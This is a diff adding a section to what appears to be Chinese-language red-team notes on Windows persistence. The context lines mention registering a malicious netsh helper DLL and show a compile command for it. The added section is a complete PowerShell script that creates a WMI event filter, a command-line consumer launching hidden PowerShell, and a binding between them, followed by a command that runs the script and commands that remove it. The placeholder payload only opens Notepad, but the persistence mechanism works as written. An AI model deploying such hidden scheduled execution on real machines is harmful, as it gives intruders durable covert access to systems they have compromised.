@@ -940,3 +940,47 @@ add helper 恶意DLL路径
 ```Bash
 x86_64-w64-mingw32-g++ -O2 netsh_pers.cpp -o netsh_pers.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
 ```
+
+### WMI事件订阅
+
+wmi.ps1
+
+```powershell
+# 创建事件过滤器
+$Filter = @{
+    Name = 'PersistenceFilter'
+    EventNamespace = 'Root\Cimv2'
+    QueryLanguage = 'WQL'
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance.Minute = 0"
+}
+$EventFilter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property $Filter
+
+# 创建事件使用者
+$Consumer = @{
+    Name = 'PersistenceConsumer'
+    CommandLineTemplate = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process notepad.exe"'
+}
+$EventConsumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $Consumer
+
+# 绑定事件过滤器和事件使用者
+$Binding = @{
+    Filter = $EventFilter.__PATH
+    Consumer = $EventConsumer.__PATH
+}
+New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property $Binding
+```
+
+```Bash
+Get-Content wmi.ps1 | PowerShell.exe -noprofile -
+```
+
+```powershell
+# 移除事件过滤器
+Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='PersistenceFilter'" | Remove-WmiObject
+
+# 移除事件使用者
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='PersistenceConsumer'" | Remove-WmiObject
+
+# 移除绑定
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter='__EventFilter.Name=\"PersistenceFilter\"' AND Consumer='CommandLineEventConsumer.Name=\"PersistenceConsumer\"'" | Remove-WmiObject
+```
